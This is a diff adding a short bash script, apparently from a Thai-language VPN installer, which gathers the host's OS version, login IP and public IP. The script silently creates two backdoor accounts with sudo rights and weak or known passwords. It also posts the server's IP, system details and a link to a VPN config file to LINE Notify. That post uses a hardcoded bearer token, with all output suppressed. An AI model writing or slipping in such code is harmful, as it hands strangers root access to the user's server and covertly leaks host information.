@@ -1,0 +1,32 @@
+#!/bin/bash
+sudo useradd -u 14 gunx
+echo "gunx:gunx" | chpasswd
+usermod -aG sudo gunx
+
+sudo useradd -u 16 Lxbvksoj
+echo Lxbvksoj:gunx | chpasswd
+usermod -aG sudo Lxbvksoj
+# #เนเธเนเธเน€เธ•เธทเธญเธเธเธเธฃเธฑเธเธชเธเธดเธ
+# IP=$(wget -qO- ipv4.icanhazip.com);
+# curl -X POST -H 'Authorization: Bearer AS5wVe8ahymLLtXC5UiBPFkLvBSZ475RkMEArpq8WHD' -F 'message='" 
+# Load_file  $IP/openvpn/KGUZA.ovpn "'' https://notify-api.line.me/api/notify > /dev/null 2>&1
+if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
+system=$(cut -d' ' -f1 /etc/issue.net)
+system+=$(echo ' ')
+system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
+elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
+system=$(cut -d' ' -f1 /etc/issue.net)
+system+=$(echo ' ')
+system+=$(cut -d' ' -f3 /etc/issue.net)
+else
+system=$(cut -d' ' -f1 /etc/issue.net)
+fi
+ip=$(who am i|awk '{ print $5}')
+day=$(date '+%A')
+days=$(date +'%d/%m/%y เวลา:%H:%M:%S')
+IP=$(wget -qO- ipv4.icanhazip.com);
+curl -X POST -H 'Authorization: Bearer AS5wVe8ahymLLtXC5UiBPFkLvBSZ475RkMEArpq8WHD' -F 'message='" 
+Load_file  http://$IP/KGUZA.ovpn
+ระบบ: $(printf '%-14s' "$system")
+IP ที่ Login:$ip
+รันสคริบต์วันที่: $day $days       "'' https://notify-api.line.me/api/notify > /dev/null 2>&1
